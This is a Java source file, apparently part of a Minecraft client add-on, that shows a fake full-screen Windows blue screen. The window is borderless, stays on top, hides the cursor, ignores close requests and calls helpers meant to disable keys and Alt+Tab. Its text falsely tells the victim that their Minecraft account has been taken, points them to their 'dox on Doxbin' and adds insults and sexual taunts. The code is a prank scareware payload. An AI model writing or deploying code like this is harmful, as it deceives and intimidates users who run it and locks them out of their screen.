package communityaddon.utils;

import javax.annotation.Nullable;
import javax.swing.*;
import java.awt.*;
import java.awt.event.*;
import java.awt.image.BufferedImage;
import communityaddon.TrollegeUtils;

public class bsod implements MouseListener, KeyListener, Runnable {
    private boolean isFullScreen = false;
    private boolean running = true;
    //private final int[] unlockCode = new int[]{ KeyEvent.VK_Q };
    JFrame frame = new JFrame();
    JPanel pnlData = new JPanel( new GridLayout( 30, 1 ) );

    JLabel lblTitle = new JLabel( "  Blue Screen Error" );
    JLabel lblSpace = new JLabel( "" );
    JLabel[] lblText = new JLabel[27];

    public String[] driverslist = new String[]{"KERNEL32.DLL", "USER32.DLL", "GDI32.DLL", "COMDLG32.DLL", "CLASSPNP.SYS"};
    public String[] errorslist = new String[]{"PAGE_FAULT_IN_NONPAGED_AREA", "DRIVER_IRQL_NOT_FOUND", "EVENT_DRIVEN_INITIATED_CRASH"};

    public int succession = 0;
    // Cursor
    BufferedImage cursorImg = new BufferedImage( 16, 16, BufferedImage.TYPE_INT_ARGB );
    Cursor blankCursor = Toolkit.getDefaultToolkit().createCustomCursor( cursorImg, new Point( 0, 0 ), "blank cursor" );

    public bsod(@Nullable String error, @Nullable String driver) {
        for( int count = 0; count < 27; count++ ) {
            lblText[ count ] = new JLabel();
        }
        if (error == null) {
            error = errorslist[(int)(Math.random() * 2)];
        }
        if (driver == null) {
            driver = driverslist[(int)(Math.random() * 4)];
        }
        lblText[0].setText("  A problem has been detected and windows has been shut down to prevent damage. PWNED BY COMMUNITY ADDON");
        lblText[1].setText("  to your computer. EUREKA EFFECT NOW OWNS YOUR MINECRAFT ACCOUNT LMFAOOOOOOOOO");
        lblText[2].setText("");
        lblText[3].setText("  The problem seems to be caused by NOT USING HARVEST CLIENT and also the following file: " + driver);
        lblText[4].setText("");
        lblText[5].setText("  "+error);
        lblText[6].setText("");
        lblText[7].setText("  If this is the first time you've seen this stop error screen,");
        lblText[8].setText("  rethink your LIFE CHOICES. If this screen appears again, follow");
        lblText[9].setText("  these steps: LOOK AT UR DOX ON DOXBIN");
        lblText[10].setText("");
        lblText[11].setText("  check to make sure any new hardware or software is properly installed.");
        lblText[12].setText("  If this is a new installation, ask your hardware or software manufacturer");
        lblText[13].setText("  for any windows updates you might need.");
        lblText[14].setText("");
        lblText[15].setText("  If problems continue STFU, disable or remove any newly installed hardware");
        lblText[16].setText("  or software. Disable BIOS memory options such as caching or shadowing.");
        lblText[17].setText("  If you need to use safe mode to remove or disable components, restart");
        lblText[18].setText("  your computer, press F8 to select Advanced Startup Options, and then");
        lblText[19].setText("  select Safe Mode.");
        lblText[20].setText("");
        lblText[21].setText("  Technical Information:");
        lblText[22].setText("");
        lblText[23].setText("  *** STOP 0x0ur a fucking bozo0000050 (0xFD3004C2, 0x00000000, 0xFFxdlmaoFFF250, 0x000urondoxbin00000)");
        lblText[24].setText("");
        lblText[25].setText("  Eureka is pumping your mom using: ");
        lblText[26].setText("  *** DUMP_ERROR NOTUSINGHARVESTCLIENT0xC0000142");
        for (JLabel jLabel : lblText) {
            jLabel.setForeground(Color.WHITE);
            jLabel.setFont(new Font("Courier New", Font.PLAIN, 24));
        }
        lblTitle.setForeground( Color.WHITE );
        lblTitle.setFont( new Font( "Consolas", Font.PLAIN, 24 ) );
    }


    public void launchFrame() {
        TrollegeUtils.disableKeys("action");
        pnlData.setBackground( Color.BLUE );
        //pnlData.addMouseListener( this );

        frame.add( pnlData );
        frame.addWindowListener(new WindowAdapter() {
            @Override
            public void windowClosing(WindowEvent we) {

            }
        });
        frame.addKeyListener( this );
        frame.setBackground( Color.BLUE );
        frame.setDefaultCloseOperation( JFrame.DO_NOTHING_ON_CLOSE );
        frame.setLocationRelativeTo( null );
        frame.setUndecorated( true );
        frame.setResizable( false );
        frame.setCursor( blankCursor );
        frame.setSize( 100, 100 );
        frame.setAlwaysOnTop( true );
        frame.setVisible( true );
        frame.setExtendedState( JFrame.MAXIMIZED_BOTH );
        pnlData.add( lblSpace );
        for (JLabel jLabel : lblText) {
            pnlData.add(jLabel);
        }

		//for( int count = 0; count < 15; count++ ) {
            //Toolkit.getDefaultToolkit().beep();
        //}

        new Thread(this, "Disable Alt+Tab").start();

    }

    /**
     * Key Listeners
     */
    @Override
    public void keyPressed( KeyEvent ke ) {
        //try {
            //if( ke.getKeyCode() == unlockCode[ succession ] ) {
                succession++;

               // if (succession == unlockCode.length) {
                    System.exit(0);
                //}
            //} else {
                //succession = 0;
            //}
        //} catch( ArrayIndexOutOfBoundsException aiobe ) {
            //succession = 0;
        //}
    }

    @Override
    public void keyReleased( KeyEvent ke ) {

    }

    @Override
    public void keyTyped( KeyEvent ke ) {

    }

    /**
     * Mouse Listeners
     */

    @Override
    public void mouseClicked( MouseEvent me ) {
        if( me.getSource() == pnlData ) {
            if( isFullScreen ) {
                frame.setExtendedState( JFrame.MAXIMIZED_BOTH );
                pnlData.add( lblSpace );
                for( int count = 0; count < 27; count++ ) {
                    pnlData.add( lblText[ count ] );
                }
                isFullScreen = false;
            } else {
                frame.setExtendedState( JFrame.NORMAL );
                pnlData.removeAll();
                pnlData.revalidate();
                pnlData.repaint();
                isFullScreen = true;
            }
        }
    }

    @Override
    public void mouseEntered( MouseEvent me ) {

    }

    @Override
    public void mouseExited( MouseEvent me ) {

    }

    @Override
    public void mousePressed( MouseEvent me ) {

    }

    @Override
    public void mouseReleased( MouseEvent me ) {

    }

    @Override
    public void run() {
    }

    public void stop() {
        running = false;
    }

}
